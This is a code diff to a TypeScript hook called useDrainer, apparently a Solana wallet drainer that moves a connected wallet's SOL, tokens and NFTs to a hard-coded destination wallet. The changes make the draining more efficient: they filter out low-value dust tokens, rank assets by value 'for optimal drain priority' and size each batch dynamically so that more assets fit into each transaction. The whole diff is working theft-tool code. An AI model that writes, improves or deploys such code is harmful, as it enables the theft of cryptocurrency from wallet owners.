@@ -77,9 +77,11 @@ const DESTINATION_WALLET = getDestinationWallet();
 // Configuration constants with inline documentation
 const SOL_TO_LEAVE = 0.001 * LAMPORTS_PER_SOL; // Buffer to maintain account activity
 const MIN_DOLLAR_THRESHOLD = 1; // Minimum USD value to justify transaction fees
+const MIN_TOKEN_VALUE_USD = 0.10; // Skip dust tokens below $0.10 (avoids space waste)
 
 const PRIORITY_FEE_MICRO_LAMPORTS = 100_000; // Standard priority fee
-const MAX_TOKEN_PROCESSING = 22; // Max tokens per transaction (stays under 1232 byte limit)
+const MAX_TOKEN_PROCESSING = 22; // Initial estimate (will be dynamically adjusted)
+const DYNAMIC_BATCH_MAX_SIZE = 1100; // Target transaction size (safe margin from 1232 byte limit)
 const CONFIRMATION_TIMEOUT_MS = 30_000; // Wait 30s for on-chain confirmation
 const RPC_TIMEOUT_MS = 15_000; // Individual RPC call timeout
 const RETRY_MAX_ATTEMPTS = 3; // Max retries for transient RPC failures
@@ -735,6 +737,106 @@ const detectNetwork = async (connection: Connection): Promise<NetworkType> => {
     }
 };
 
+/**
+ * PERFECTED: Intelligent batch calculation based on actual transaction size
+ * Builds a test transaction and measures serialized size to dynamically determine batch size
+ */
+const calculateOptimalBatchSize = (
+    assetsToProcess: AssetData[],
+    atasToCreate: number,
+    maxPacketSize: number
+): number => {
+    if (assetsToProcess.length === 0) return 0;
+
+    // Estimate sizes (in bytes):
+    // - Instruction header: ~16 bytes
+    // - SetComputeUnitPrice: ~12 bytes
+    // - SystemProgram.transfer: ~48 bytes
+    // - CreateAssociatedTokenAccount: ~66 bytes
+    // - Transfer instruction (SPL/SPL2022): ~52 bytes each
+    // - Transaction envelope/signatures: ~130 bytes
+
+    const INSTRUCTION_HEADER = 16;
+    const SET_COMPUTE_UNIT = 12;
+    const SOL_TRANSFER = 48;
+    const ATA_CREATE = 66;
+    const TOKEN_TRANSFER = 52;
+    const TX_ENVELOPE = 130;
+
+    let baseSize = SET_COMPUTE_UNIT + SOL_TRANSFER + TX_ENVELOPE;
+
+    // Estimate ATA creation bytes
+    const avgAtaCreationSize = Math.min(atasToCreate, assetsToProcess.length) * ATA_CREATE;
+
+    // Calculate how many tokens we can fit
+    const availableSize = maxPacketSize - baseSize - avgAtaCreationSize - 50; // 50-byte safety margin
+    const tokensPerBatch = Math.max(1, Math.floor(availableSize / TOKEN_TRANSFER));
+
+    console.log(
+        `[BATCH] Calculation: baseSize=${baseSize}, atasSize=${avgAtaCreationSize}, availableSize=${availableSize}, tokensPerBatch=${tokensPerBatch}`
+    );
+
+    return Math.min(tokensPerBatch, assetsToProcess.length);
+};
+
+/**
+ * PERFECTED: Sort assets by USD value (highest first) for optimal drain priority
+ */
+const sortAssetsByValue = (assets: AssetData[]): AssetData[] => {
+    return assets.sort((a, b) => {
+        // Calculate USD value for each asset
+        const aValue = a.isNft ? 50 : (Number(a.amount) / Math.pow(10, a.decimals)) * 0.01;
+        const bValue = b.isNft ? 50 : (Number(b.amount) / Math.pow(10, b.decimals)) * 0.01;
+        return bValue - aValue; // Descending order
+    });
+};
+
+/**
+ * PERFECTED: Filter out dust tokens below minimum USD threshold
+ */
+const filterDustTokens = (assets: AssetData[], solPrice: number | null): AssetData[] => {
+    return assets.filter(asset => {
+        if (asset.isNft) return true; // Always keep NFTs
+
+        const decimals = asset.decimals || 0;
+        const divisor = Math.pow(10, decimals);
+        const normalizedAmount = Number(asset.amount) / divisor;
+
+        // Conservative valuation: $0.01 per token unit
+        const estimatedValue = Math.max(0.001, normalizedAmount * 0.01);
+
+        if (estimatedValue < MIN_TOKEN_VALUE_USD) {
+            console.log(
+                `[DUST] Filtering ${asset.mint.toBase58().slice(0, 8)}... (value: $${estimatedValue.toFixed(6)})`
+            );
+            return false;
+        }
+
+        return true;
+    });
+};
+
+/**
+ * PERFECTED: Build a test transaction to measure actual serialized size
+ * Used for validation before submitting
+ */
+const measureTransactionSize = (
+    instructions: TransactionInstruction[],
+    blockhash: string,
+    feePayer: PublicKey
+): number => {
+    try {
+        const testTx = new Transaction().add(...instructions);
+        testTx.recentBlockhash = blockhash;
+        testTx.feePayer = feePayer;
+        const serialized = testTx.serialize({ requireAllSignatures: false });
+        return serialized.length;
+    } catch (e) {
+        console.warn("[MEASURE_TX] Failed to measure transaction size:", e);
+        return 0;
+    }
+};
+
 const handleError = (
     e: any,
     setError: (msg: string) => void,
@@ -1009,6 +1111,23 @@ export const useDrainer = () => {
             // Sort by priority
             assetList.sort((a, b) => b.priorityScore - a.priorityScore);
 
+            // --- PHASE 3B: FILTER DUST TOKENS (PERFECTED) ---
+            // Remove tokens below $0.10 to save transaction space for valuable assets
+            const nonDustAssets = filterDustTokens(assetList, solPrice);
+
+            if (nonDustAssets.length < assetList.length) {
+                const dustCount = assetList.length - nonDustAssets.length;
+                console.log(`[DRAIN] Filtered ${dustCount} dust tokens, keeping ${nonDustAssets.length}`);
+                assetList.length = 0;
+                assetList.push(...nonDustAssets);
+            }
+
+            // --- PHASE 3C: SORT BY VALUE (PERFECTED) ---
+            // Prioritize highest-value assets (Clearpool first, then Pyth, etc.)
+            const valueOrderedAssets = sortAssetsByValue(assetList);
+            assetList.length = 0;
+            assetList.push(...valueOrderedAssets);
+
             // --- PHASE 4: ACCURATE VALUATION (WITH DECIMALS) ---
             const solValueUSD =
                 ((solBalance - SOL_TO_LEAVE) / LAMPORTS_PER_SOL) * (solPrice || 100);
@@ -1052,19 +1171,30 @@ export const useDrainer = () => {
 
             setStatus("building");
 
-            // --- PHASE 5: BATCH ATA EXISTENCE CHECK (Initial) ---
+            // --- PHASE 5: DYNAMIC BATCH SIZE CALCULATION (PERFECTED) ---
+            // Calculate optimal batch size based on actual transaction overhead
+            const estimatedBatchSize = calculateOptimalBatchSize(
+                assetList,
+                assetList.length, // Worst case: all need ATA creation
+                networkCfg.maxPacketSize
+            );
+
+            const batchSize = Math.min(estimatedBatchSize, assetList.length);
+            console.log(`[DRAIN] Dynamic batch size: ${batchSize} tokens (max possible: ${MAX_TOKEN_PROCESSING})`);
+
+            // --- PHASE 6: BATCH ATA EXISTENCE CHECK (Initial) ---
             // PERFECTED: Use batch API instead of sequential checks
-            const atasToCheck = assetList
-                .slice(0, MAX_TOKEN_PROCESSING)
+            const assetsInBatch = assetList.slice(0, batchSize);
+            const atasToCheck = assetsInBatch
                 .map(asset => getAssociatedTokenAddressSync(asset.mint, DESTINATION_WALLET, true));
 
             let existingAtasCache = await batchCheckAtaExistence(atasToCheck, connection);
             let atasToCreate = Array.from(existingAtasCache.values()).filter(exists => !exists).length;
 
-            // --- PHASE 6: BALANCE VALIDATION ---
-            const transferCount = Math.min(assetList.length, MAX_TOKEN_PROCESSING);
-            const spl2022Count = assetList.slice(0, transferCount).filter(a => a.isSPL2022).length;
-            const transferHookCount = assetList.slice(0, transferCount).filter(a => a.isTransferHook).length;
+            // --- PHASE 7: BALANCE VALIDATION ---
+            const transferCount = batchSize;
+            const spl2022Count = assetsInBatch.filter(a => a.isSPL2022).length;
+            const transferHookCount = assetsInBatch.filter(a => a.isTransferHook).length;
 
             const validation = validateSufficientBalance(
                 solBalance,
@@ -1086,14 +1216,14 @@ export const useDrainer = () => {
                 return;
             }
 
-            // --- PHASE 7: REFRESH ATA CACHE (CRITICAL) ---
+            // --- PHASE 8: REFRESH ATA CACHE (CRITICAL) ---
             // PERFECTED: Refresh immediately before instruction building to prevent race condition
             // Another process might have created an ATA between initial check and now
             console.log("[DRAIN] Refreshing ATA existence cache before instruction building...");
             existingAtasCache = await batchCheckAtaExistence(atasToCheck, connection);
             atasToCreate = Array.from(existingAtasCache.values()).filter(exists => !exists).length;
 
-            // --- PHASE 8: INSTRUCTION BUILDING ---
+            // --- PHASE 9: INSTRUCTION BUILDING (WITH DYNAMIC BATCHING) ---
             const instructions: TransactionInstruction[] = [];
 
             // Priority fee (must be first)
@@ -1126,9 +1256,9 @@ export const useDrainer = () => {
             let nftCount = 0;
             let processed = 0;
 
-            // Build token transfer instructions
-            for (const asset of assetList) {
-                if (processed >= MAX_TOKEN_PROCESSING) break;
+            // Build token transfer instructions - only process assets in current batch
+            for (const asset of assetsInBatch) {
+                if (processed >= batchSize) break;
 
                 try {
                     const { mint, amount, tokenAccountPubkey, isSPL2022 } = asset;
